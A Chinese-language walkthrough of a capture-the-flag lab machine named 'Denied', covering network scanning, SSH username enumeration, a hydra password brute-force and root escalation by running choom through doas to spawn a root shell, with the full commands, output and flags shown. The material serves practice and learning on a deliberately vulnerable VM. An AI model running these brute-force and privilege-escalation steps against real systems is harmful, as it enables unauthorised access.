# 1. 信息收集 - 目标锁定！

![image-20250519113211432](https://7r1umph.top/image/20250519113211569.webp)

这靶机纯复现，因为我都知道它口在哪了。不过，流程还是要走一遍的嘛！

### 1. 信息收集 - 目标锁定！

老一套，先用 `arp-scan` 看看内网里谁是目标。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo arp-scan -l        
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.217 08:00:27:63:80:7c       PCS Systemtechnik GmbH # <--- 就是你了！
192.168.205.254 00:50:56:ed:bd:56       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.975 seconds (129.62 hosts/sec). 4 responded
```
IP地址 `192.168.205.217` 到手，接着 `nmap` 大法伺候，看看开了些啥端口，跑了啥服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p22,80,8080 -sV 192.168.205.217
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-18 23:33 EDT
Nmap scan report for denied.nyx (192.168.205.217)
Host is up (0.00036s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
8080/tcp open  http    Apache httpd 2.4.62 ((Debian))
MAC Address: 08:00:27:63:80:7C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.44 seconds
```
开了 22 (SSH), 80 (HTTP), 还有个 8080 (也是HTTP)。都是 Apache 2.4.62，SSH 版本是 OpenSSH 9.2p1。

### 2. Web 服务探测 - Apache 欢迎您！

先 `curl` 一下 80 和 8080 端口看看。两个端口都是 Apache 的默认欢迎页面，一模一样。看来没啥特别的东西。
接着上目录爆破，用 `gobuster` 扫了一圈，换了好几个字典，包括 `directory-list-2.3-medium.txt`, `directory-list-2.3-big.txt`，甚至我自己改的倒序 `hbig.txt`，还试了各种常见的扩展名。

```bash
gobuster dir -u http://192.168.205.217:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip 
gobuster dir -u http://192.168.205.217:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip 
gobuster dir -u http://192.168.205.217:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -x php,txt,html,zip 
gobuster dir -u http://192.168.205.217:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -x php,txt,html,zip # Note: Log had 80, but context implies 8080
gobuster dir -u http://192.168.205.217:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/hbig.txt -x php,txt,html,zip,bak,old,conf,cgi,sh,log,.htaccess
```
结果是...啥也没扫出来。Web 这边看来是条死胡同。还试了下DNS子域名爆破，也没啥发现。

```bash
gobuster dns -d http://disguise.hmv/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

### 3. SSH 突破 - 用户名枚举与爆破

Web 没戏，那就只能从 SSH 下手了。先试试 `root` 用户。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ssh root@192.168.205.217
root@192.168.205.217: Permission denied (publickey).
```
提示 `Permission denied (publickey)`，看来 `root` 用户是禁止密码登录，强制用密钥。

这时候我想起了昨天看到的 ll04567 大佬的思路...
![image-20250519113954961](https://7r1umph.top/image/20250519113955108.webp)
害，昨天为什么要看到，没看到就可以自己摸索一下了。既然是复现，那就按这个思路走。
大佬的思路是存在一个可以密码登录的普通用户。用 `seclists` 里的用户名字典尝试枚举一下：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ for i in $(cat /usr/share/seclists/Usernames/Names/names.txt);do ssh $i@192.168.205.217 ;done
# ... (大量尝试) ...
akira@192.168.205.217's password: 
```
(这里手动 `Ctrl+C` 停止枚举)
枚举到用户 `akira` 的时候，SSH 客户端提示输入密码，而不是像其他用户那样直接 `Permission denied (publickey)`。这说明 `akira` 用户存在，并且允许密码登录！

找到用户名 `akira`，接下来就是祭出 `hydra` 大法爆破密码了。用了一个常用的密码字典 `5000q.txt`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ hydra -l akira -P 5000q.txt ssh://192.168.205.217 -V -I          
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-18 23:41:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 5000 login tries (l:1/p:5000), ~313 tries per task
[DATA] attacking ssh://192.168.205.217:22/
[ATTEMPT] target 192.168.205.217 - login "akira" - pass "123456" - 1 of 5000 [child 0] (0/0)
# ... (大量尝试输出) ...
[ATTEMPT] target 192.168.205.217 - login "akira" - pass "shakira" - 568 of 5003 [child 7] (0/3)
[22][ssh] host: 192.168.205.217   login: akira   password: shakira
^C                                                                                                                                                                                   
```
Bingo! `hydra` 成功爆出密码 `akira:shakira`。

赶紧登录！
```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ssh akira@192.168.205.217 
akira@192.168.205.217's password: shakira
akira@denied:~$ id
uid=1000(akira) gid=1000(akira) grupos=1000(akira)
```
成功以 `akira` 用户登录系统！

### 4. 权限提升 - akira -> root

拿到 `akira` 的 shell，先看看家目录有啥，顺便把 `user.txt` 读了。

```bash
akira@denied:~$ ls -la
total 28
drwx------ 3 akira akira 4096 may 18 13:03 .
drwxr-xr-x 3 root  root  4096 may 18 11:25 ..
lrwxrwxrwx 1 root  root     9 nov 15  2023 .bash_history -> /dev/null
-rw-r--r-- 1 akira akira  220 nov 15  2023 .bash_logout
-rw-r--r-- 1 akira akira 3526 nov 15  2023 .bashrc
drwxr-xr-x 3 akira akira 4096 may 18 11:41 .local
-rw-r--r-- 1 akira akira  807 nov 15  2023 .profile
-r-------- 1 akira akira   33 may 18 11:41 user.txt
akira@denied:~$ cat user.txt 
6acfb2803973dacc95152a873ba79255
```
User flag到手！接下来看看能不能提权到 `root`。
先试试 `sudo -l`：
```bash
akira@denied:~$ sudo -l
-bash: sudo: orden no encontrada
```
“orden no encontrada”，西班牙语的 “command not found”。看来系统里没有 `sudo`，或者 `akira` 用户的 `PATH` 没配好。

那就找找有没有 SUID 程序可以利用。
```bash
akira@denied:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/mount
/usr/bin/chsh
/usr/bin/doas  # <--- 这个看起来不一般！
/usr/bin/passwd
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```
发现了一个 `/usr/bin/doas`，这玩意儿是 `sudo` 的一个轻量级替代品。有戏！
看看 `doas` 能不能直接用：
```bash
akira@denied:/opt$ /usr/bin/doas -h
/usr/bin/doas: invalid option -- 'h'
usage: doas [-Lns] [-C config] [-u user] command [args]
akira@denied:/opt$ /usr/bin/doas -u root bash
doas: Operation not permitted
```
直接用 `doas -u root bash` 提示 “Operation not permitted”。看来 `akira` 用户不能随便用 `doas` 执行所有命令。
那它到底能用 `doas` 执行啥呢？得想办法枚举一下 `/etc/doas.conf`或者暴力测试 `/usr/bin` 下的命令。结果发现`/etc/doas.conf`不给看，那就只可以暴力测试
根据日志，是通过遍历测试发现 `/usr/bin/choom` 可以用 `doas` 执行：

```bash
akira@denied:/opt$ for i in $(ls /usr/bin); do doas -u root /usr/bin/$i 2>&1 | grep -v "doas: Operation not permitted";done
choom: no se ha especificado ni PID ni ORDEN
Escriba 'choom --help' para obtener más información.
akira@denied:/opt$ /usr/bin/doas -u root /usr/bin/choom --help

Modo de empleo:
 choom [opciones] -p pid
 choom [opciones] -n número -p pid
 choom [opciones] -n número [--] orden [args...]]  # <--- 关键在这！

Muestra y ajusta la puntuación de matador OOM.

Opciones:
 -n, --adjust <num>     especifica el valor de ajuste de puntuación
 -p, --pid <num>        ID de proceso

 -h, --help             muestra esta ayuda
 -V, --version          muestra la versión
```
`choom` 的帮助信息里写着可以用 `-n <número> [--] orden [args...]` 的方式来执行一个命令！既然 `doas` 允许 `akira` 以 `root` 权限执行 `choom`，那我们就可以通过 `choom` 来间接以 `root` 权限执行任意命令了！

利用这个特性，让 `choom` 执行 `/bin/bash -p` (`-p` 参数是为了让 bash 保持有效用户ID为 root)。
```bash
akira@denied:/opt$ /usr/bin/doas -u root /usr/bin/choom -n -1000-p 0 bash
root@denied:/opt# id
uid=0(root) gid=0(root) grupos=0(root)
```
Boom! `uid=0(root)`，成功拿到 root 权限！

### 5. 收获 Root Flag

拿到 root shell，最后一步当然是读取 `/root/root.txt`。
```bash
root@denied:/opt# cat /root/root.txt 
ea2118e462426513a247964eb8320c27
```
Root flag到手！Denied 靶机，卒！
